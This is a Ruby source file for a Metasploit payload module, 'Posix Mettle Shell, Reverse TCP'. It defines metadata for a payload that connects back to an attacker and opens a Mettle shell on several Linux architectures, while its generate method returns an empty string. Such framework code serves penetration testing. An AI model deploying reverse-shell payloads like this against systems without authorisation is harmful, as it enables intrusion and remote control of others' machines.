##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/mettle_posix'
require 'msf/base/sessions/meterpreter_options'

module MetasploitModule

  CachedSize = :dynamic

  include Msf::Payload::Linux
  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Posix Mettle Shell, Reverse TCP',
      'Description' => 'Connect back to attacker and spawn a Mettle shell',
      'Author'      => [ 'Brent Cook' ],
      'Platform'    => '',
      'Arch'        => [ ARCH_X86, ARCH_X86_64, ARCH_PPC, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE ],
      'License'     => MSF_LICENSE,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Mettle_Posix
      ))
  end

  def generate
    return ''
  end

end

